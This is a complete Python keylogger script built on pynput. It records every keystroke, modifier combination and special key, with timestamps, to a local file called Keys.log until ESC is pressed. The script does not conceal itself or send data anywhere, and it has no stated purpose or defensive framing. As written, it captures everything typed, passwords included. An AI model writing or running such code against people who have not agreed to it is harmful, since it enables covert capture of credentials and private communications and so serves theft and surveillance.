from pynput import keyboard
from pynput.keyboard import Listener, Key
import time
from datetime import datetime

log_file = "Keys.log"

key_press_times = {}
current_line = []
modifier_state = set()

MODIFIERS = {
    Key.ctrl_l, Key.ctrl_r,
    Key.alt_l, Key.alt_r,
    Key.shift_l, Key.shift_r,
    Key.cmd, Key.cmd_r
}

MODIFIER_LABELS = {
    Key.ctrl_l: "CTRL", Key.ctrl_r: "CTRL",
    Key.alt_l:  "ALT",  Key.alt_r:  "ALT",
    Key.shift_l:"SHIFT",Key.shift_r:"SHIFT",
    Key.cmd:    "WIN",  Key.cmd_r:  "WIN",
}

SPECIAL_LABELS = {
    Key.space:     " ",
    Key.enter:     "\n[ENTER]\n",
    Key.backspace: "[BKSP]",
    Key.tab:       "[TAB]",
    Key.delete:    "[DEL]",
    Key.esc:       "[ESC]",
    Key.up:        "[UP]",
    Key.down:      "[DOWN]",
    Key.left:      "[LEFT]",
    Key.right:     "[RIGHT]",
    Key.home:      "[HOME]",
    Key.end:       "[END]",
    Key.page_up:   "[PGUP]",
    Key.page_down: "[PGDN]",
    Key.caps_lock: "[CAPS]",
    Key.f1:  "[F1]",  Key.f2:  "[F2]",  Key.f3:  "[F3]",
    Key.f4:  "[F4]",  Key.f5:  "[F5]",  Key.f6:  "[F6]",
    Key.f7:  "[F7]",  Key.f8:  "[F8]",  Key.f9:  "[F9]",
    Key.f10: "[F10]", Key.f11: "[F11]", Key.f12: "[F12]",
}

session_start = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def write_log(text):
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(text)

def flush_line(reason=""):
    if current_line:
        content = "".join(current_line)
        timestamp = datetime.now().strftime("%H:%M:%S")
        write_log(f"[{timestamp}] {content}\n")
        current_line.clear()

def on_press(key):
    key_press_times[key] = time.time()
    if key in MODIFIERS:
        modifier_state.add(key)
        return
    if modifier_state:
        mods = "+".join(sorted(set(MODIFIER_LABELS[m] for m in modifier_state)))
        if hasattr(key, 'char') and key.char:
            combo = f"[{mods}+{key.char.upper()}]"
        else:
            label = SPECIAL_LABELS.get(key, f"[{key.name.upper()}]")
            combo = f"[{mods}+{label.strip('[]')}]"
        current_line.append(combo)
        return
    if key == Key.enter:
        current_line.append("[ENTER]")
        flush_line()
        return
    if key in SPECIAL_LABELS:
        current_line.append(SPECIAL_LABELS[key])
        return
    try:
        if key.char:
            current_line.append(key.char)
    except AttributeError:
        current_line.append(f"[{key.name.upper()}]")

def on_release(key):
    if key in key_press_times:
        duration = time.time() - key_press_times.pop(key)
    if key in MODIFIERS:
        modifier_state.discard(key)
        return
    if key == Key.esc:
        flush_line()
        write_log(f"\n--- Session ended at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")
        return False

write_log(f"\n{'='*50}\n Session started: {session_start}\n{'='*50}\n")

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
